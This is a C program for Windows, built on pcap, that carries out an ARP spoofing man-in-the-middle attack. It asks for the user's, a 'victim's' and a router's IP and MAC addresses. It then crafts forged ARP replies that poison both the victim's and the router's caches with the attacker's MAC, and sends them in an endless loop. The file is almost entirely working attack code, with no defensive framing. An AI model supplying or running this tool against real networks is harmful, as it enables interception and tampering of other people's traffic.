#include<stdio.h>
#include <winsock2.h>
#include <pcap.h>
#include <stdint.h>
#include<stdlib.h>

#pragma pack(push, 1)

struct eth_header{
    uint8_t dst_mac[6];
    uint8_t src_mac[6];
    uint16_t ethertype;
};

struct arp_header{
    uint16_t hardware_type;    
    uint16_t protocol_type;    
    uint8_t  hardware_len;     
    uint8_t  protocol_len;     
    uint16_t opcode;           
    uint8_t  sender_mac[6];    
    uint8_t  sender_ip[4];     
    uint8_t  target_mac[6];    
    uint8_t  target_ip[4];
};
struct arp_packet{
        struct eth_header eth;
        struct arp_header arp;
    };

#pragma pack(pop)

void mac_address(const char *str, uint8_t* mac_array){
    sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac_array[0], &mac_array[1],&mac_array[2],&mac_array[3],&mac_array[4],&mac_array[5]);
    for(int i = 0; i < 6; i++) {
    printf("%02x ", mac_array[i]);
    
}
printf("\n");
}

pcap_t*  select_and_open_adapter(){

    int choice;
    pcap_if_t *alldevs;
    pcap_if_t *d;
    int i = 0;
    

    char errbuf[PCAP_ERRBUF_SIZE];

    if(pcap_findalldevs(&alldevs, errbuf) == -1){
        fprintf(stderr, "%s\n", errbuf);
        return NULL;
    }

    for(d = alldevs; d != NULL; d = d->next)
    {
        printf("%d. %s", ++i, d->name);
        if(d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No Description available)\n");
    }

    if(i == 0)
    {
        printf("(No interfaces found)");
        return NULL;
    }
//doing choice 
    
    printf("Enter number to choice adapter you need: ");
    scanf("%d", &choice);
    while (getchar() != '\n' && getchar() != EOF);

    int j = 1;
    for(d = alldevs ; d!=NULL; d = d->next)
        {
            if(j==choice)
            {
                printf("You select: %s",d->name);
                if(d->description)
                printf(" (%s)\n", d->description);
                else
                printf(" (No Description available)\n");
                break;
            }
            ++j; 
        }
        if(d==NULL){
            printf("Error: Invalid adapter number!\n");
            pcap_freealldevs(alldevs); 
            return NULL;
        }
//open_live
    pcap_t *handle;
    
    handle = pcap_open_live(d->name, BUFSIZ, 1 , 1000, errbuf);
    if(handle == NULL){
        fprintf(stderr, "Couldn't open device %s: %s\n", d->name, errbuf);
        pcap_freealldevs(alldevs);
        return NULL;
    }
    
/*Если ваша программа не поддерживает заголовки
канального уровня предоставляемые устройством, 
то она должна будет прекратить работу, с помощью подобного кода*/

    if (pcap_datalink(handle) != DLT_EN10MB) 
    {
    fprintf(stderr, "Device %s doesn't provide Ethernet headers -not  supported\n", d->name);
    pcap_freealldevs(alldevs);
    return NULL;
    }


    pcap_freealldevs(alldevs);
    return handle;
}

int main(){

    pcap_t *handle = select_and_open_adapter();
    if (handle == NULL) {
    printf("Failed to start network interface. Exit.\n");
    return 1;
    }

    struct arp_packet packet_to_victim;

    packet_to_victim.eth.dst_mac;
    packet_to_victim.eth.src_mac;
    packet_to_victim.eth.ethertype = htons(0x0806);

    packet_to_victim.arp.hardware_len = 6;
    packet_to_victim.arp.hardware_type = htons(1);
    packet_to_victim.arp.opcode = htons(2);
    packet_to_victim.arp.protocol_len = 4;
    packet_to_victim.arp.protocol_type = htons(0x0800);
    packet_to_victim.arp.sender_ip;
    packet_to_victim.arp.sender_mac;
    packet_to_victim.arp.target_ip;
    packet_to_victim.arp.target_mac;


    struct arp_packet packet_to_router;

    packet_to_router.eth.dst_mac;
    packet_to_router.eth.src_mac;
    packet_to_router.eth.ethertype = htons(0x0806);

    packet_to_router.arp.hardware_len = 6;
    packet_to_router.arp.hardware_type = htons(1);
    packet_to_router.arp.opcode = htons(2);
    packet_to_router.arp.protocol_len = 4;
    packet_to_router.arp.protocol_type = htons(0x0800);
    packet_to_router.arp.sender_ip;
    packet_to_router.arp.sender_mac;
    packet_to_router.arp.target_ip;
    packet_to_router.arp.target_mac;

  
    char my_ip_str[32];
    char victim_ip_str[32];
    char router_ip_str[32];

    uint32_t my_ip;
    uint32_t victim_ip;
    uint32_t router_ip;


    char my_mac_str[32];
    char victim_mac_str[32];
    char router_mac_str[32];

    

    //mac_address("00:0c:29:4f:bb:11", packet_to_victim.eth.dst_mac);

   // printf("%x\n",packet_to_victim.eth.dst_mac);

//ip_buffer[strcspn(ip_buffer, "\n")] = 0;

//You
    
    printf("Your profile: \n");
    printf("Enter your IP address: ");
    fgets(my_ip_str, sizeof(my_ip_str),stdin);
    my_ip_str[strcspn(my_ip_str, "\n")] = 0;
    my_ip = inet_addr(my_ip_str);
   


    printf("Enter your MAC address: ");
    fgets(my_mac_str, sizeof(my_mac_str),stdin);
    my_mac_str[strcspn(my_mac_str, "\n")] = 0;

//Victim
    printf("Victim profile: \n");
    printf("Enter victim IP address: ");
    fgets(victim_ip_str, sizeof(victim_ip_str),stdin);
    victim_ip_str[strcspn(victim_ip_str, "\n")] = 0;
    victim_ip = inet_addr(victim_ip_str);

    printf("Enter victim MAC address: ");
    fgets(victim_mac_str, sizeof(victim_mac_str),stdin);
    victim_mac_str[strcspn(victim_mac_str, "\n")] = 0;

//Router
    printf("Router profile: \n");
    printf("Enter Router IP address: ");
    fgets(router_ip_str, sizeof(router_ip_str),stdin);
    router_ip_str[strcspn(router_ip_str, "\n")] = 0;
    router_ip = inet_addr(router_ip_str);

    printf("Enter router MAC address: ");
    fgets(router_mac_str, sizeof(router_mac_str),stdin);
    router_mac_str[strcspn(router_mac_str, "\n")] = 0;


//Configuration

    //Packet to victim
    mac_address(victim_mac_str, packet_to_victim.eth.dst_mac);
    mac_address(victim_mac_str, packet_to_victim.arp.target_mac);   

    mac_address(my_mac_str, packet_to_victim.eth.src_mac);
    mac_address(my_mac_str, packet_to_victim.arp.sender_mac);

    memcpy(packet_to_victim.arp.sender_ip, &router_ip, 4);           //Router IP
    memcpy(packet_to_victim.arp.target_ip, &victim_ip, 4);             //Victim IP


    //Packet to router
    mac_address(router_mac_str, packet_to_router.eth.dst_mac);
    mac_address(router_mac_str, packet_to_router.arp.target_mac);

    mac_address(my_mac_str, packet_to_router.eth.src_mac);
    mac_address(my_mac_str, packet_to_router.arp.sender_mac);

    memcpy(packet_to_router.arp.sender_ip, &victim_ip, 4);           
    memcpy(packet_to_router.arp.target_ip, &router_ip, 4); 


//Send down the Packets
    while(1){
        pcap_sendpacket(handle, (const u_char*)&packet_to_victim, sizeof(packet_to_victim));
        pcap_sendpacket(handle, (const u_char*)&packet_to_router, sizeof(packet_to_router));

        Sleep(1000);
    }
    


    

    return 0;
}



/*  const char *ip_str = "127.0.0.1";

    uint32_t ip_binary = inet_addr(ip_str);


    if(ip_binary == INADDR_NONE){
        printf("Error");
    }
    else{
        printf("IP in binary: %lu\n", ip_binary );
    }
*/


 //   printf("%zu\n", sizeof(struct eth_header));
 //   printf("%zu\n", sizeof(struct arp_header));